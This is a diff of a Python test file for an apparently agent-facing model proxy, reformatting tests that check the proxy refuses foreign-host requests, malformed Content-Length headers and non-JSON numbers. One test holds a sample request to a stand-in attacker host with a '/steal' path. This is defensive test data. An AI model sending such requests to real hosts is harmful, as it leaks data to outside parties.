@@ -149,7 +149,7 @@ def test_absolute_form_requests_are_routed_by_host_and_foreign_hosts_are_refused
     refused = raw_request(
         host,
         port,
-        b"POST http://attacker.example/steal HTTP/1.1\r\nHost: attacker.example\r\n" b"Content-Length: 2\r\n\r\n{}",
+        b"POST http://attacker.example/steal HTTP/1.1\r\nHost: attacker.example\r\nContent-Length: 2\r\n\r\n{}",
     )
     assert status_of(refused) == 404, "an absolute-form request for another host is not routed"
     assert proxy.stats.model_calls == 1
@@ -218,7 +218,7 @@ def test_a_malformed_content_length_is_refused(value: str, live_proxy):
     response = raw_request(
         host,
         port,
-        f"POST /openai/v1/chat/completions HTTP/1.1\r\nHost: localhost\r\n" f"Content-Length: {value}\r\n\r\n".encode(),
+        f"POST /openai/v1/chat/completions HTTP/1.1\r\nHost: localhost\r\nContent-Length: {value}\r\n\r\n".encode(),
     )
     assert status_of(response) in {400, 411}
 
@@ -555,12 +555,12 @@ def test_a_request_body_carrying_a_non_json_number_is_refused_by_name(live_proxy
     denial = next(event for event in proxy.ledger.events if event.type == "net.denied")
     assert denial.data["code"] == "non_finite_number"
     assert token in denial.data["reason"]
-    assert not [
-        event for event in proxy.ledger.events if event.type == "model.request"
-    ], "the body was refused before any upstream call was attempted"
-    assert not [
-        event for event in proxy.ledger.events if event.type == "model.error"
-    ], "a refusal is not an internal error: nothing here is a defect in the boundary"
+    assert not [event for event in proxy.ledger.events if event.type == "model.request"], (
+        "the body was refused before any upstream call was attempted"
+    )
+    assert not [event for event in proxy.ledger.events if event.type == "model.error"], (
+        "a refusal is not an internal error: nothing here is a defect in the boundary"
+    )
 
 
 def test_an_agent_reported_event_cannot_smuggle_a_non_json_number(live_proxy):
@@ -591,7 +591,7 @@ def test_a_ledger_line_with_a_non_json_number_is_damage_and_not_a_crashed_tail(t
     """
     path = tmp_path / "hostile.jsonl"
     path.write_bytes(
-        b'{"seq":0,"ts":"2026-10-14T00:00:00Z","type":"note","data":{"v":Infinity},' b'"prev":null,"hash":"deadbeef"}'
+        b'{"seq":0,"ts":"2026-10-14T00:00:00Z","type":"note","data":{"v":Infinity},"prev":null,"hash":"deadbeef"}'
     )
     _events, diagnostics = Ledger.read_with_diagnostics(path)
     assert diagnostics["healthy"] is False
